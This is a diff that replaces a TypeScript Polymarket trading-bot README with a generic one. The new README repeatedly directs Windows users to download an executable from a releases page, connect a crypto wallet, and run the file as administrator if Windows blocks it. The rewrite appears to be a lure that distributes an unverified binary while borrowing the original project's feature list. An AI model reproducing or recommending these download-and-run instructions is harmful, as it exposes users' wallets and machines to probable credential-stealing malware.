@@ -1,225 +1,125 @@
-# Polymarket Trading Bot (TypeScript)
+# 🤖 Polymarket-Strategies - Simple Market Trading Tools
 
-English | [简体中文](README_CN.md)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/dtonl4149/Polymarket-Strategies/releases)
 
-A beginner-friendly **TypeScript / Node.js** port of the Polymarket trading bot: gasless-capable execution, real-time WebSocket data, 15-minute market helpers, and a Flash Crash strategy—aligned with the Python [`polymarket-trading-bot`](../polymarket-trading-bot) layout and features.
+## 📥 Download
+Visit this page to download: https://github.com/dtonl4149/Polymarket-Strategies/releases
 
-## Features
+Pick the latest release for Windows and download the file that matches your PC.
 
-- **Simple API**: Few lines to start trading
-- **Gasless transactions**: Builder Program credentials (same env vars as Python)
-- **Real-time WebSocket**: Live orderbook updates (`ws`)
-- **15-minute markets**: BTC / ETH / SOL / XRP Up/Down discovery via Gamma API
-- **Flash Crash strategy**: Same idea as the Python strategy (extend `FlashCrashStrategy`)
-- **Terminal UI**: Strategy status + orderbook-style display in the Flash Crash TUI
-- **Secure key storage**: PBKDF2 + Fernet-compatible encryption
-- **Tests**: [Vitest](https://vitest.dev/) suite under `tests/`
+## 🪟 What You Need
+- Windows 10 or Windows 11
+- An internet connection
+- A Polymarket account
+- A wallet set up for Polymarket use
+- Enough free space for the app and its data
 
-## Requirements
+## 🚀 Getting Started
+Follow these steps to get the app running on Windows.
 
-- **Node.js 18+** (global `fetch`)
+1. Open the download page above.
+2. Find the latest release.
+3. Download the Windows file from that release.
+4. Open the file after the download finishes.
+5. If Windows asks for permission, select Open or Run.
+6. Follow the setup steps on screen.
+7. Start the app when setup ends.
 
-## Quick start (about 5 minutes)
+## 🧭 First Run
+When you open Polymarket-Strategies for the first time, it may ask you to set a few simple options.
 
-### 1. Install
+- Sign in with your Polymarket details if the app asks for it
+- Connect your wallet if needed
+- Pick the market you want to watch or trade
+- Choose a strategy
+- Review the trade settings before you start
 
-```bash
-cd polymarket-trading-bot-ts
-npm install
-```
+## ⚙️ Main Features
+- Gasless-capable trade execution
+- Live market data through WebSocket
+- 15-minute market helpers
+- Flash Crash strategy support
+- TypeScript / Node.js app structure
+- Layout aligned with the Python polymarket-trading-bot project
+- Easy-to-follow setup for end users
 
-### 2. Configure
+## 🧩 What the App Does
+Polymarket-Strategies helps you watch markets and act on price moves with less manual work.
 
-```bash
-# Copy the example env and edit
-cp .env.example .env
-```
+It can:
+- Track live updates
+- Watch short-term market changes
+- Help with quick market decisions
+- Use strategy rules you set before trading
+- Reduce the need to keep refreshing the page
 
-Set at least:
+## 🖥️ How to Use It
+After setup, use the app like this:
 
-```bash
-POLY_PRIVATE_KEY=your_metamask_private_key
-POLY_SAFE_ADDRESS=0xYourPolymarketSafeAddress
-```
+1. Open the app.
+2. Select a market.
+3. Choose a strategy.
+4. Set your trade size.
+5. Confirm your settings.
+6. Start the strategy.
+7. Watch results in the app.
 
-> **Safe address:** [polymarket.com/settings](https://polymarket.com/settings) → copy your wallet address.
+If you want to stop, open the app and turn the strategy off.
 
-### 3. Run
+## 🔒 Before You Trade
+Keep these points in mind before you place real trades.
 
-```bash
-# Quickstart (open orders + trades demo)
-npm run example:quickstart
+- Check the market name twice
+- Confirm your wallet is connected to the right account
+- Start with a small amount
+- Review each setting before you begin
+- Make sure your internet stays on during use
 
-# Interactive CLI (like Python run_bot.py --interactive)
-npm start -- --interactive
+## 🛠️ Common Problems
+If the app does not open, try these steps:
 
-# One-off setup → config.yaml + encrypted key (like Python scripts/setup.py)
-npm run setup
-```
+- Download the file again
+- Right-click the file and run it as administrator
+- Check that Windows did not block the file
+- Restart your PC and try again
+- Make sure your internet works
+- Install the latest Windows updates
 
-## Strategies (TypeScript)
+If the app opens but does not connect:
+- Check your internet connection
+- Sign in again
+- Reconnect your wallet
+- Close the app and open it again
 
-The Flash Crash implementation lives in `strategies/flash_crash.ts` as `FlashCrashStrategy`. Run it from your own entry file (or extend `examples/strategy_example.ts`):
+## 📁 Release Files
+The release page may include files such as:
+- Windows installer
+- Portable Windows app
+- Source files for developers
+- Release notes
 
-```typescript
-import "dotenv/config";
-import { Config } from "./src/config.js";
-import { TradingBot } from "./src/bot.js";
-import { FlashCrashStrategy, FlashCrashConfig } from "./strategies/index.js";
+For most users, the Windows app file is the one to download.
 
-const config = Config.fromEnv();
-const bot = new TradingBot({ config, privateKey: process.env.POLY_PRIVATE_KEY! });
-const strategy = new FlashCrashStrategy(bot, new FlashCrashConfig());
-await strategy.run(); // Ctrl+C to stop
-```
+## 🧪 What Is Inside
+This project uses:
+- TypeScript
+- Node.js
+- Real-time market feeds
+- Strategy logic for Polymarket
+- A structure based on the Python bot layout
 
-> The Python repo ships extra CLIs (`flash_crash_strategy.py`, `orderbook_tui.py`) that are not duplicated here; the same logic is available as the classes above—add a thin `scripts/run_flash_crash.ts` if you want matching CLIs.
+## 📌 Project Topics
+- bot
+- polymarket
+- trading
 
-Strategy authoring: see `docs/strategy_guide.md` (same docs tree as Python).
+## 📎 Download Again
+If you need to get the app later, use the release page:
+https://github.com/dtonl4149/Polymarket-Strategies/releases
 
-## Code examples
-
-### Minimal: bot from environment
-
-```typescript
-import "dotenv/config";
-import { createBotFromEnv } from "./src/utils.js";
-
-const bot = createBotFromEnv();
-const orders = await bot.getOpenOrders();
-console.log(`Open orders: ${orders.length}`);
-```
-
-### Place an order
-
-```typescript
-import { TradingBot, Config } from "./src/index.js";
-
-const config = new Config();
-config.safe_address = "0xYourSafe";
-
-const bot = new TradingBot({ config, privateKey: "0xYourPrivateKey" });
-
-const result = await bot.placeOrder("token_id_here", 0.65, 10, "BUY");
-console.log(result.success, result.order_id, result.message);
-```
-
-### WebSocket orderbook
-
-```typescript
-import { MarketWebSocket } from "./src/websocket_client.js";
-
-const ws = new MarketWebSocket();
-ws.on_book((snapshot) => {
-  console.log("mid", snapshot.mid_price);
-});
-await ws.subscribe(["token_id_1", "token_id_2"]);
-await ws.run(true);
-```
-
-### Gamma: current 15m market
-
-```typescript
-import { GammaClient } from "./src/gamma_client.js";
-
-const gamma = new GammaClient();
-const market = await gamma.getMarketInfo("BTC");
-if (market) {
-  console.log(market["question"]);
-  console.log(market["token_ids"]);
-}
-```
-
-## Project structure
-
-```
-polymarket-trading-bot-ts/
-├── src/                    # Core library (.ts)
-│   ├── bot.ts              # TradingBot
-│   ├── config.ts
-│   ├── client.ts           # CLOB + Relayer
-│   ├── signer.ts           # EIP-712 (ethers)
-│   ├── crypto.ts
-│   ├── utils.ts
-│   ├── gamma_client.ts
-│   ├── websocket_client.ts
-│   └── index.ts            # Re-exports
-├── lib/                    # Market / positions / console helpers
-├── strategies/             # base.ts, flash_crash.ts
-├── examples/               # quickstart, basic_trading, strategy_example
-├── scripts/                # run_bot, setup, full_test
-├── tests/                  # Vitest
-├── docs/                   # Shared reference docs (mirrors Python tree)
-├── package.json
-├── tsconfig.json
-└── vitest.config.ts
-```
-
-## Configuration
-
-### Environment variables
-
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `POLY_PRIVATE_KEY` | Yes* | Wallet private key |
-| `POLY_SAFE_ADDRESS` | Yes* | Polymarket Safe address |
-| `POLY_BUILDER_API_KEY` | For gasless | Builder API key |
-| `POLY_BUILDER_API_SECRET` | For gasless | Builder secret |
-| `POLY_BUILDER_API_PASSPHRASE` | For gasless | Builder passphrase |
-
-\*Or use encrypted key + `config.yaml` via `npm run setup` / `scripts/run_bot.ts` without `.env` keys.
-
-### `config.yaml`
-
-You can use the same shape as the Python project (see `../polymarket-trading-bot/config.example.yaml`). Load with:
-
-```typescript
-const bot = new TradingBot({
-  configPath: "config.yaml",
-  privateKey: process.env.POLY_PRIVATE_KEY!,
-});
-```
-
-## Gasless trading
-
-Same as Python: add Builder env vars or `builder:` block in YAML. When configured, `use_gasless` is set and the relayer client is available.
-
-## API notes (Python vs TypeScript)
-
-| Python | TypeScript |
-|--------|------------|
-| `snake_case` methods | `camelCase` (`placeOrder`, `getOpenOrders`, …) |
-| `asyncio` + sync signer | `async` signing and HTTP (`fetch`) |
-| `is_initialized()` | `isInitialized()` |
-
-## Security
-
-- PBKDF2 (480k iterations) + Fernet-style tokens for encrypted key files
-- Do not commit `.env` or `credentials/`
-- Prefer a dedicated trading wallet
-
-## Testing
-
-```bash
-npm test
-```
-
-Integration-style checks (needs real env):
-
-```bash
-npm run full-test
-```
-
-## Troubleshooting
-
-| Issue | What to try |
-|-------|-------------|
-| Missing keys | Set `POLY_PRIVATE_KEY` + `POLY_SAFE_ADDRESS` in `.env` |
-| Wrong Safe | Copy from polymarket.com/settings |
-| Invalid key | 64 hex chars (with or without `0x`) |
-| Order errors | Balance, approvals, token id |
-| WebSocket | Firewall / VPN |
-
-## License
-
-MIT License (match your parent repo if you keep a single `LICENSE`).
+## 🔧 Basic Setup Tips
+- Keep the app updated
+- Use one wallet for one account
+- Close other heavy apps if your PC runs slow
+- Save your settings after changes
+- Test with a small trade first
